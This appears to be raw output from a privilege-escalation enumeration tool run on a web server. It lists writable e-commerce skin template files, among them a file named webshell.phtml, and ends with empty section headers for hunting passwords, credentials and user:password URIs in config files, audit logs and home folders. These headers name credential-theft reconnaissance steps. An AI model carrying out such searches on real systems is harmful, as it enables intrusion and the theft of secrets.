+/var/www/skins/new_vision_blue/customer/js_menu/theme.js
+/var/www/skins/new_vision_blue/customer/js_menu/menu_items.js
+/var/www/skins/new_vision_blue/customer/js_menu/theme.css
+/var/www/skins/new_vision_blue/customer/js_menu/JSCookMenu.js
+/var/www/skins/new_vision_blue/customer/meta.tpl
+/var/www/skins/new_vision_blue/customer/exceptions_pages
+/var/www/skins/new_vision_blue/customer/exceptions_pages/access_denied.tpl
+/var/www/skins/new_vision_blue/customer/exceptions_pages/exceptions_list.tpl
+/var/www/skins/new_vision_blue/customer/exceptions_pages/no_page.tpl
+/var/www/skins/new_vision_blue/customer/exceptions_pages/no_product.tpl
+/var/www/skins/new_vision_blue/customer/auth_pages
+/var/www/skins/new_vision_blue/customer/auth_pages/logout.tpl
+/var/www/skins/new_vision_blue/customer/auth_pages/login.tpl
+/var/www/skins/new_vision_blue/customer/auth_pages/recover_password.tpl
+/var/www/skins/new_vision_blue/customer/products_pages
+/var/www/skins/new_vision_blue/customer/products_pages/products_search_results.tpl
+/var/www/skins/new_vision_blue/customer/products_pages/products_advanced.tpl
+/var/www/skins/new_vision_blue/customer/products_pages/sorting.tpl
+/var/www/skins/new_vision_blue/customer/products_pages/product_metas.tpl
+/var/www/skins/new_vision_blue/customer/products_pages/products_small_list.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/customer/popup_image.tpl
+/var/www/skins/new_vision_blue/admin
+/var/www/skins/new_vision_blue/admin/pages_pages
+/var/www/skins/new_vision_blue/admin/pages_pages/pages_search.tpl
+/var/www/skins/new_vision_blue/admin/pages_pages/pages_update.tpl
+/var/www/skins/new_vision_blue/admin/pages_pages/pages_m_add.tpl
+/var/www/skins/new_vision_blue/admin/pages_pages/pages_select_fields.tpl
+/var/www/skins/new_vision_blue/admin/pages_pages/pages_m_update.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/content.tpl
+/var/www/skins/new_vision_blue/admin/sitemap_pages
+/var/www/skins/new_vision_blue/admin/sitemap_pages/links.tpl
+/var/www/skins/new_vision_blue/admin/sitemap_pages/sitemap.tpl
+/var/www/skins/new_vision_blue/admin/main.tpl
+/var/www/skins/new_vision_blue/admin/profiles_pages
+/var/www/skins/new_vision_blue/admin/profiles_pages/multiple_profiles.tpl
+/var/www/skins/new_vision_blue/admin/profiles_pages/profiles.tpl
+/var/www/skins/new_vision_blue/admin/profiles_pages/profiles_contact.tpl
+/var/www/skins/new_vision_blue/admin/profiles_pages/profiles_scripts.tpl
+/var/www/skins/new_vision_blue/admin/profiles_pages/user_search.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/side_boxes
+/var/www/skins/new_vision_blue/admin/side_boxes/help.tpl
+/var/www/skins/new_vision_blue/admin/side_boxes/logout.tpl
+/var/www/skins/new_vision_blue/admin/side_boxes/look_n_feel.tpl
+/var/www/skins/new_vision_blue/admin/side_boxes/orders.tpl
+/var/www/skins/new_vision_blue/admin/side_boxes/catalog.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/addons
+/var/www/skins/new_vision_blue/admin/addons/related_products
+/var/www/skins/new_vision_blue/admin/addons/related_products/products.tpl
+/var/www/skins/new_vision_blue/admin/addons/manufacturers
+/var/www/skins/new_vision_blue/admin/addons/manufacturers/manufacturer_image.tpl
+/var/www/skins/new_vision_blue/admin/addons/manufacturers/manufacturers.tpl
+/var/www/skins/new_vision_blue/admin/addons/manufacturers/manufacturer_details.tpl
+/var/www/skins/new_vision_blue/admin/addons/product_reviews
+/var/www/skins/new_vision_blue/admin/addons/product_reviews/reviews.tpl
+/var/www/skins/new_vision_blue/admin/addons/news_and_emails
+/var/www/skins/new_vision_blue/admin/addons/news_and_emails/news_details.tpl
+/var/www/skins/new_vision_blue/admin/addons/news_and_emails/news.tpl
+/var/www/skins/new_vision_blue/admin/addons/news_and_emails/newsletters.tpl
+/var/www/skins/new_vision_blue/admin/addons/news_and_emails/site_subscribers.tpl
+/var/www/skins/new_vision_blue/admin/addons/news_and_emails/newsletter_details.tpl
+/var/www/skins/new_vision_blue/admin/addons/featured_products
+/var/www/skins/new_vision_blue/admin/addons/featured_products/categories.tpl
+/var/www/skins/new_vision_blue/admin/addons/ads
+/var/www/skins/new_vision_blue/admin/addons/ads/ad_details.tpl
+/var/www/skins/new_vision_blue/admin/addons/ads/ad_image.tpl
+/var/www/skins/new_vision_blue/admin/addons/ads/ads.tpl
+/var/www/skins/new_vision_blue/admin/addons/wholesale_trade
+/var/www/skins/new_vision_blue/admin/addons/wholesale_trade/products.tpl
+/var/www/skins/new_vision_blue/admin/welcome.tpl
+/var/www/skins/new_vision_blue/admin/buttons
+/var/www/skins/new_vision_blue/admin/buttons/update_profile.tpl
+/var/www/skins/new_vision_blue/admin/buttons/button_popup.tpl
+/var/www/skins/new_vision_blue/admin/buttons/register.tpl
+/var/www/skins/new_vision_blue/admin/buttons/button.tpl
+/var/www/skins/new_vision_blue/admin/buttons/modify_selected.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/discounts_pages
+/var/www/skins/new_vision_blue/admin/discounts_pages/discount_products.tpl
+/var/www/skins/new_vision_blue/admin/discounts_pages/discount_users.tpl
+/var/www/skins/new_vision_blue/admin/discounts_pages/discount_global.tpl
+/var/www/skins/new_vision_blue/admin/discounts_pages/discounts.tpl
+/var/www/skins/new_vision_blue/admin/discounts_pages/discount_categories.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/orders_pages
+/var/www/skins/new_vision_blue/admin/orders_pages/placing_order.tpl
+/var/www/skins/new_vision_blue/admin/orders_pages/orders.tpl
+/var/www/skins/new_vision_blue/admin/orders_pages/om_summary.tpl
+/var/www/skins/new_vision_blue/admin/orders_pages/om_profiles.tpl
+/var/www/skins/new_vision_blue/admin/orders_pages/orders_search_form.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/look_n_feel_pages
+/var/www/skins/new_vision_blue/admin/look_n_feel_pages/index_page.tpl
+/var/www/skins/new_vision_blue/admin/look_n_feel_pages/skin_selector.tpl
+/var/www/skins/new_vision_blue/admin/look_n_feel_pages/languages.tpl
+/var/www/skins/new_vision_blue/admin/look_n_feel_pages/logs.tpl
+/var/www/skins/new_vision_blue/admin/look_n_feel_pages/settings.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/bottom.tpl
+/var/www/skins/new_vision_blue/admin/top_quick_links.tpl
+/var/www/skins/new_vision_blue/admin/shippings_pages
+/var/www/skins/new_vision_blue/admin/shippings_pages/rates.tpl
+/var/www/skins/new_vision_blue/admin/shippings_pages/shippings.tpl
+/var/www/skins/new_vision_blue/admin/shippings_pages/shipping_update.tpl
+/var/www/skins/new_vision_blue/admin/memberships_pages
+/var/www/skins/new_vision_blue/admin/memberships_pages/membership_privileges.tpl
+/var/www/skins/new_vision_blue/admin/memberships_pages/memberships.tpl
+/var/www/skins/new_vision_blue/admin/memberships_pages/privileges.tpl
+/var/www/skins/new_vision_blue/admin/locations
+/var/www/skins/new_vision_blue/admin/locations/destinations.tpl
+/var/www/skins/new_vision_blue/admin/locations/destination_update.tpl
+/var/www/skins/new_vision_blue/admin/locations/countries.tpl
+/var/www/skins/new_vision_blue/admin/locations/states.tpl
+/var/www/skins/new_vision_blue/admin/template_editor_pages
+/var/www/skins/new_vision_blue/admin/template_editor_pages/template_editor.tpl
+/var/www/skins/new_vision_blue/admin/template_editor_pages/chmod.tpl
+/var/www/skins/new_vision_blue/admin/template_editor_pages/file_list.tpl
+/var/www/skins/new_vision_blue/admin/template_editor_pages/edit_file.tpl
+/var/www/skins/new_vision_blue/admin/top.tpl
+/var/www/skins/new_vision_blue/admin/index.tpl
+/var/www/skins/new_vision_blue/admin/html_catalog_pages
+/var/www/skins/new_vision_blue/admin/html_catalog_pages/html_catalog.tpl
+/var/www/skins/new_vision_blue/admin/styles.css
+/var/www/skins/new_vision_blue/admin/images
+/var/www/skins/new_vision_blue/admin/topics_pages
+/var/www/skins/new_vision_blue/admin/topics_pages/topics_tree.tpl
+/var/www/skins/new_vision_blue/admin/topics_pages/topics_m_update.tpl
+/var/www/skins/new_vision_blue/admin/topics_pages/topics_select_fields.tpl
+/var/www/skins/new_vision_blue/admin/topics_pages/topics_update.tpl
+/var/www/skins/new_vision_blue/admin/topics_pages/topics_m_viewadded.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/forms_pages
+/var/www/skins/new_vision_blue/admin/forms_pages/forms.tpl
+/var/www/skins/new_vision_blue/admin/forms_pages/form_elements.tpl
+/var/www/skins/new_vision_blue/admin/payments_pages
+/var/www/skins/new_vision_blue/admin/payments_pages/payments.tpl
+/var/www/skins/new_vision_blue/admin/payments_pages/payments_list.tpl
+/var/www/skins/new_vision_blue/admin/payments_pages/cc_processors
+/var/www/skins/new_vision_blue/admin/payments_pages/cc_processors/viaklix2.tpl
+/var/www/skins/new_vision_blue/admin/payments_pages/cc_processors/paypal.tpl
+/var/www/skins/new_vision_blue/admin/payments_pages/cc_processors/mcpe.tpl
+/var/www/skins/new_vision_blue/admin/payments_pages/cc_processors/thaiepay.tpl
+/var/www/skins/new_vision_blue/admin/payments_pages/cc_processors/cardia.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/demo_skin_selector.tpl
+/var/www/skins/new_vision_blue/admin/common_templates
+/var/www/skins/new_vision_blue/admin/common_templates/fileuploader.tpl
+/var/www/skins/new_vision_blue/admin/common_templates/greet.tpl
+/var/www/skins/new_vision_blue/admin/common_templates/pagination.tpl
+/var/www/skins/new_vision_blue/admin/common_templates/loading_box.tpl
+/var/www/skins/new_vision_blue/admin/common_templates/price.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/tools_pages
+/var/www/skins/new_vision_blue/admin/tools_pages/import_catalog.tpl
+/var/www/skins/new_vision_blue/admin/tools_pages/tools.tpl
+/var/www/skins/new_vision_blue/admin/tools_pages/export_catalog.tpl
+/var/www/skins/new_vision_blue/admin/tools_pages/export_csv_template.tpl
+/var/www/skins/new_vision_blue/admin/tools_pages/csv_delimiters.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/categories_pages
+/var/www/skins/new_vision_blue/admin/categories_pages/categories_select_fields.tpl
+/var/www/skins/new_vision_blue/admin/categories_pages/categories_update.tpl
+/var/www/skins/new_vision_blue/admin/categories_pages/categories_tree_nojs.tpl
+/var/www/skins/new_vision_blue/admin/categories_pages/categories_m_add.tpl
+/var/www/skins/new_vision_blue/admin/categories_pages/category_image.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/upgrade_center_pages
+/var/www/skins/new_vision_blue/admin/upgrade_center_pages/upgrade_center.tpl
+/var/www/skins/new_vision_blue/admin/taxes_pages
+/var/www/skins/new_vision_blue/admin/taxes_pages/rates.tpl
+/var/www/skins/new_vision_blue/admin/taxes_pages/tax_update.tpl
+/var/www/skins/new_vision_blue/admin/taxes_pages/taxes.tpl
+/var/www/skins/new_vision_blue/admin/scripts
+/var/www/skins/new_vision_blue/admin/scripts/form_scripts.tpl
+/var/www/skins/new_vision_blue/admin/scripts/fileuploader_scripts.js
+/var/www/skins/new_vision_blue/admin/scripts/template_editor_scripts.js
+/var/www/skins/new_vision_blue/admin/scripts/form_scripts.js
+/var/www/skins/new_vision_blue/admin/scripts/browser_detection.js
+/var/www/skins/new_vision_blue/admin/js_menu
+/var/www/skins/new_vision_blue/admin/js_menu/emenu.tpl
+/var/www/skins/new_vision_blue/admin/js_menu/theme.js
+/var/www/skins/new_vision_blue/admin/js_menu/theme.css
+/var/www/skins/new_vision_blue/admin/js_menu/JSCookMenu.js
+/var/www/skins/new_vision_blue/admin/meta.tpl
+/var/www/skins/new_vision_blue/admin/exceptions_pages
+/var/www/skins/new_vision_blue/admin/exceptions_pages/access_denied.tpl
+/var/www/skins/new_vision_blue/admin/exceptions_pages/exceptions_list.tpl
+/var/www/skins/new_vision_blue/admin/exceptions_pages/no_page.tpl
+/var/www/skins/new_vision_blue/admin/exceptions_pages/no_product.tpl
+/var/www/skins/new_vision_blue/admin/auth_pages
+/var/www/skins/new_vision_blue/admin/auth_pages/logout.tpl
+/var/www/skins/new_vision_blue/admin/auth_pages/login.tpl
+/var/www/skins/new_vision_blue/admin/auth_pages/recover_password.tpl
+/var/www/skins/new_vision_blue/admin/products_pages
+/var/www/skins/new_vision_blue/admin/products_pages/product_features_vars.tpl
+/var/www/skins/new_vision_blue/admin/products_pages/options_exceptions.tpl
+/var/www/skins/new_vision_blue/admin/products_pages/products_list.tpl
+/var/www/skins/new_vision_blue/admin/products_pages/product_image.tpl
+/var/www/skins/new_vision_blue/admin/products_pages/global_options.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/statistics_pages
+/var/www/skins/new_vision_blue/admin/statistics_pages/edit_table_old.tpl
+/var/www/skins/new_vision_blue/admin/statistics_pages/parameter_details.tpl
+/var/www/skins/new_vision_blue/admin/statistics_pages/edit_report_old.tpl
+/var/www/skins/new_vision_blue/admin/statistics_pages/reports.tpl
+/var/www/skins/new_vision_blue/admin/statistics_pages/edit_table.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/mail
+/var/www/skins/new_vision_blue/mail/letter_header.tpl
+/var/www/skins/new_vision_blue/mail/addons
+/var/www/skins/new_vision_blue/mail/addons/news_and_emails
+/var/www/skins/new_vision_blue/mail/addons/news_and_emails/newsletter_subj.tpl
+/var/www/skins/new_vision_blue/mail/addons/news_and_emails/updates_subscribed.tpl
+/var/www/skins/new_vision_blue/mail/addons/news_and_emails/updates_subscribed_subj.tpl
+/var/www/skins/new_vision_blue/mail/addons/news_and_emails/newsletter_body.tpl
+/var/www/skins/new_vision_blue/mail/addons/send_to_friend
+/var/www/skins/new_vision_blue/mail/addons/send_to_friend/mail_subj.tpl
+/var/www/skins/new_vision_blue/mail/addons/send_to_friend/mail.tpl
+/var/www/skins/new_vision_blue/mail/orders
+/var/www/skins/new_vision_blue/mail/orders/low_stock.tpl
+/var/www/skins/new_vision_blue/mail/orders/order_notification_processed.tpl
+/var/www/skins/new_vision_blue/mail/orders/order_notification_declined_subj.tpl
+/var/www/skins/new_vision_blue/mail/orders/order_notification_open.tpl
+/var/www/skins/new_vision_blue/mail/orders/order_notification_processed_subj.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/mail/images
+/var/www/skins/new_vision_blue/mail/common_templates
+/var/www/skins/new_vision_blue/mail/common_templates/price.tpl
+/var/www/skins/new_vision_blue/mail/common_templates/options_info.tpl
+/var/www/skins/new_vision_blue/mail/common_templates/modifier.tpl
+/var/www/skins/new_vision_blue/mail/letter_footer.tpl
+/var/www/skins/new_vision_blue/mail/profiles
+/var/www/skins/new_vision_blue/mail/profiles/update_profile.tpl
+/var/www/skins/new_vision_blue/mail/profiles/create_profile_subj.tpl
+/var/www/skins/new_vision_blue/mail/profiles/recover_password_subj.tpl
+/var/www/skins/new_vision_blue/mail/profiles/update_profile_subj.tpl
+/var/www/skins/new_vision_blue/mail/profiles/membership_request_subj.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/mail/forms
+/var/www/skins/new_vision_blue/mail/forms/form_subject.tpl
+/var/www/skins/new_vision_blue/mail/forms/form_body.tpl
+/var/www/skins/webshell.phtml
+/var/www/skins/default_blue
+/var/www/skins/default_blue/customer
+/var/www/skins/default_blue/customer/pages_pages
+/var/www/skins/default_blue/customer/pages_pages/page_details.tpl
+/var/www/skins/default_blue/customer/pages_pages/pages_search_results.tpl
+/var/www/skins/default_blue/customer/pages_pages/pages.tpl
+/var/www/skins/default_blue/customer/content.tpl
+/var/www/skins/default_blue/customer/sitemap_pages
+/var/www/skins/default_blue/customer/sitemap_pages/sitemap.tpl
+/var/www/skins/default_blue/customer/sitemap_pages/categories_tree.tpl
+/var/www/skins/default_blue/customer/main.tpl
+/var/www/skins/default_blue/customer/profiles_pages
+/var/www/skins/default_blue/customer/profiles_pages/multiple_profiles.tpl
+/var/www/skins/default_blue/customer/profiles_pages/profiles.tpl
+/var/www/skins/default_blue/customer/profiles_pages/profiles_contact.tpl
+/var/www/skins/default_blue/customer/profiles_pages/profiles_scripts.tpl
+/var/www/skins/default_blue/customer/profiles_pages/profiles_account.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/customer/side_boxes
+/var/www/skins/default_blue/customer/side_boxes/logout.tpl
+/var/www/skins/default_blue/customer/side_boxes/cart.tpl
+/var/www/skins/default_blue/customer/side_boxes/search.tpl
+/var/www/skins/default_blue/customer/side_boxes/recent_products.tpl
+/var/www/skins/default_blue/customer/side_boxes/site_info.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/customer/addons
+/var/www/skins/default_blue/customer/addons/related_products
+/var/www/skins/default_blue/customer/addons/related_products/customer_product_details.tpl
+/var/www/skins/default_blue/customer/addons/manufacturers
+/var/www/skins/default_blue/customer/addons/manufacturers/manufacturer_image.tpl
+/var/www/skins/default_blue/customer/addons/manufacturers/manufacturers.tpl
+/var/www/skins/default_blue/customer/addons/manufacturers/manufacturer.tpl
+/var/www/skins/default_blue/customer/addons/manufacturers/sidebox_manufacturers.tpl
+/var/www/skins/default_blue/customer/addons/product_reviews
+/var/www/skins/default_blue/customer/addons/product_reviews/stars.tpl
+/var/www/skins/default_blue/customer/addons/product_reviews/product_details.tpl
+/var/www/skins/default_blue/customer/addons/news_and_emails
+/var/www/skins/default_blue/customer/addons/news_and_emails/side_boxes
+/var/www/skins/default_blue/customer/addons/news_and_emails/side_boxes/news.tpl
+/var/www/skins/default_blue/customer/addons/news_and_emails/news.tpl
+/var/www/skins/default_blue/customer/addons/featured_products
+/var/www/skins/default_blue/customer/addons/featured_products/customer_categories.tpl
+/var/www/skins/default_blue/customer/addons/customers_also_bought
+/var/www/skins/default_blue/customer/addons/customers_also_bought/product_details.tpl
+/var/www/skins/default_blue/customer/addons/send_to_friend
+/var/www/skins/default_blue/customer/addons/send_to_friend/send_to_friend.tpl
+/var/www/skins/default_blue/customer/addons/bestsellers
+/var/www/skins/default_blue/customer/addons/bestsellers/sidebox.tpl
+/var/www/skins/default_blue/customer/addons/ads
+/var/www/skins/default_blue/customer/addons/ads/ad_image.tpl
+/var/www/skins/default_blue/customer/addons/ads/ads.tpl
+/var/www/skins/default_blue/customer/addons/wholesale_trade
+/var/www/skins/default_blue/customer/addons/wholesale_trade/customer_product_details.tpl
+/var/www/skins/default_blue/customer/welcome.tpl
+/var/www/skins/default_blue/customer/buttons
+/var/www/skins/default_blue/customer/buttons/update_profile.tpl
+/var/www/skins/default_blue/customer/buttons/my_account.tpl
+/var/www/skins/default_blue/customer/buttons/add_to_wishlist.tpl
+/var/www/skins/default_blue/customer/buttons/continue_shopping.tpl
+/var/www/skins/default_blue/customer/buttons/button_popup.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/customer/popup_image.css
+/var/www/skins/default_blue/customer/orders_pages
+/var/www/skins/default_blue/customer/orders_pages/download.tpl
+/var/www/skins/default_blue/customer/orders_pages/placing_order.tpl
+/var/www/skins/default_blue/customer/orders_pages/orders.tpl
+/var/www/skins/default_blue/customer/orders_pages/order_details.tpl
+/var/www/skins/default_blue/customer/orders_pages/order_status.tpl
+/var/www/skins/default_blue/customer/bottom.tpl
+/var/www/skins/default_blue/customer/top_quick_links.tpl
+/var/www/skins/default_blue/customer/cart_pages
+/var/www/skins/default_blue/customer/cart_pages/profiles.tpl
+/var/www/skins/default_blue/customer/cart_pages/wishlist.tpl
+/var/www/skins/default_blue/customer/cart_pages/cart_status.tpl
+/var/www/skins/default_blue/customer/cart_pages/cart.tpl
+/var/www/skins/default_blue/customer/cart_pages/shipping_rates.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/customer/top_menu.tpl
+/var/www/skins/default_blue/customer/top.tpl
+/var/www/skins/default_blue/customer/index.tpl
+/var/www/skins/default_blue/customer/payments
+/var/www/skins/default_blue/customer/payments/cc_outside.tpl
+/var/www/skins/default_blue/customer/payments/personal_check.tpl
+/var/www/skins/default_blue/customer/payments/check.tpl
+/var/www/skins/default_blue/customer/payments/business_check.tpl
+/var/www/skins/default_blue/customer/payments/fax.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/customer/styles.css
+/var/www/skins/default_blue/customer/images
+/var/www/skins/default_blue/customer/topics_pages
+/var/www/skins/default_blue/customer/topics_pages/topics_tree.tpl
+/var/www/skins/default_blue/customer/topics_pages/topics_dtree.tpl
+/var/www/skins/default_blue/customer/topics_pages/topics_dtree_child.tpl
+/var/www/skins/default_blue/customer/topics_pages/topics.tpl
+/var/www/skins/default_blue/customer/search_pages
+/var/www/skins/default_blue/customer/search_pages/search.tpl
+/var/www/skins/default_blue/customer/forms_pages
+/var/www/skins/default_blue/customer/forms_pages/forms.tpl
+/var/www/skins/default_blue/customer/demo_skin_selector.tpl
+
+[+] Searching passwords in config PHP files
+
+[+] Checking for TTY (sudo/su) passwords in audit logs
+
+[+] Finding IPs inside logs (limit 70)
+
+[+] Finding passwords inside logs (limit 70)
+
+[+] Finding emails inside logs (limit 70)
+
+[+] Finding *password* or *credential* files in home (limit 70)
+
+[+] Finding URIs with user:password@host inside key folders
